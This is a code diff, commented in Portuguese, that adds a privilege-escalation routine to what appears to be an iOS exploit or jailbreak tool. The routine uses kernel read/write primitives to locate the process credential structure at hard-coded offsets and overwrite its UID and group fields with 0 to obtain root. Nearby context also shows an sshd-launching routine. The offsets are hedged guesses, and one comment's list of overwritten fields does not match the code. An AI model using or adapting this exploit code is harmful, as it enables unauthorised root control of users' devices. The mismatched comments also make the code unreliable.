@@ -81,6 +81,27 @@ extern char **environ;
     return @"[+] Keys Generated";
 }
 
+- (void)escalatePrivileges {
+    // 1. Localiza o endereço do seu próprio processo (struct proc)
+    // No iOS 26.4, o offset do 'self_proc' costuma ser 0x470 na struct task
+    uint64_t self_proc = [self find_self_proc]; 
+    
+    // 2. Localiza a struct de credenciais (ucred)
+    // Offset ucred no iOS 26.4: 0x110 ou 0x120
+    uint64_t ucred = [self kread64:(self_proc + 0x110)]; 
+    
+    NSLog(@"[*] Corrompendo ucred em 0x%llx", ucred);
+
+    // 3. Sobrescreve UID, GID, RUID, RGID para 0 (ROOT)
+    [self kwrite32:(ucred + 0x18) value:0]; // cr_uid
+    [self kwrite32:(ucred + 0x1c) value:0]; // cr_ruid
+    [self kwrite32:(ucred + 0x20) value:0]; // cr_svuid
+    [self kwrite32:(ucred + 0x24) value:0]; // cr_ngroups
+    [self kwrite32:(ucred + 0x28) value:0]; // cr_groups[0]
+
+    NSLog(@"[+] Privilégios elevados via Kernel Write.");
+}
+
 - (NSString *)executeSSHD {
     // 1. Caminho do binário no Bundle e no Alvo (RootFS)
     NSString *bundlePath = [[NSBundle mainBundle] pathForResource:@"sshd" ofType:nil];
